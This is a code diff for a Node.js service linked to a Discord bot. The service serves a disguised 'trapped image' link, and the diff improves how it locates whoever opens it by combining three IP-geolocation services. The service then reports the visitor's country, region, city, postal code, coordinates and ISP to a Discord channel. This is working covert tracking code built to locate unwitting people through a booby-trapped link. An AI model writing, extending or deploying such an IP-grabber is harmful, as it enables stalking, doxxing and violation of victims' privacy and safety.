@@ -23,6 +23,7 @@ const {
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
+const BDC_TOKEN = process.env.BDC_TOKEN;
 const TRACKER_BASE_URL = "https://tracker-09q2.onrender.com/image.jpg?u=";
 const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
 const CLIENTS_FILE = './clients.json';
@@ -36,13 +37,12 @@ let lookup;
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-function compareFields(ipinfoValue, maxmindValue) {
-  if (!ipinfoValue && !maxmindValue) return '❌ Introuvable';
-  if (ipinfoValue && !maxmindValue) return ipinfoValue;
-  if (!ipinfoValue && maxmindValue) return maxmindValue;
-  return ipinfoValue.toLowerCase() === maxmindValue.toLowerCase()
-    ? ipinfoValue
-    : `${ipinfoValue} / ${maxmindValue}`;
+function compareFields(values) {
+  // values = [bigData, ipinfo, maxmind]
+  const cleaned = values.filter(v => v && v !== 'undefined');
+  if (cleaned.length === 0) return '❌ Introuvable';
+  if (cleaned.length === 1) return cleaned[0];
+  return cleaned.join(' / ');
 }
 
 app.get('/image.jpg', async (req, res) => {
@@ -56,6 +56,7 @@ app.get('/image.jpg', async (req, res) => {
 
   let geo = {};
   let ipinfo = {};
+  let bigdata = {};
 
   try {
     geo = lookup.get(ip) || {};
@@ -66,8 +67,13 @@ app.get('/image.jpg', async (req, res) => {
     ipinfo = response.data || {};
   } catch (e) {}
 
-  const coordMaxMind = geo?.location ? `${geo.location.latitude} , ${geo.location.longitude}` : null;
-  const coords = compareFields(ipinfo.loc, coordMaxMind);
+  try {
+    const response = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
+    bigdata = response.data || {};
+  } catch (e) {}
+
+  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
+  const coordsBigData = bigdata.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
 
   const embed = new EmbedBuilder()
     .setTitle("📸 Image piégée ouverte !")
@@ -75,15 +81,15 @@ app.get('/image.jpg', async (req, res) => {
     .setColor(0xff6600)
     .addFields(
       { name: "🌍 Localisation", value: `
-**Pays :** ${compareFields(ipinfo.country, geo?.country?.names?.fr)}
-**Région :** ${compareFields(ipinfo.region, geo?.subdivisions?.[0]?.names?.fr)}
-**Ville :** ${compareFields(ipinfo.city, geo?.city?.names?.fr)}
-**Code postal :** ${compareFields(ipinfo.postal, geo?.postal?.code)}
-**Coordonnées :** ${coords}
-**FAI :** ${compareFields(ipinfo.org, geo?.traits?.isp)}
+**Pays :** ${compareFields([bigdata.country?.name, ipinfo.country, geo?.country?.names?.fr])}
+**Région :** ${compareFields([bigdata.principalSubdivision, ipinfo.region, geo?.subdivisions?.[0]?.names?.fr])}
+**Ville :** ${compareFields([bigdata.city?.name, ipinfo.city, geo?.city?.names?.fr])}
+**Code postal :** ${compareFields([bigdata.postcode, ipinfo.postal, geo?.postal?.code])}
+**Coordonnées :** ${compareFields([coordsBigData, ipinfo.loc, coordsMaxMind])}
+**FAI :** ${compareFields([ipinfo.org, geo?.traits?.isp])}
 `.trim() }
     )
-    .setFooter({ text: "🔍 Tracker automatique", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
+    .setFooter({ text: "🔍 Tracker Automatique Boosté", iconURL: "https://cdn-icons-png.flaticon.com/512/3524/3524393.png" })
     .setTimestamp();
 
   try {
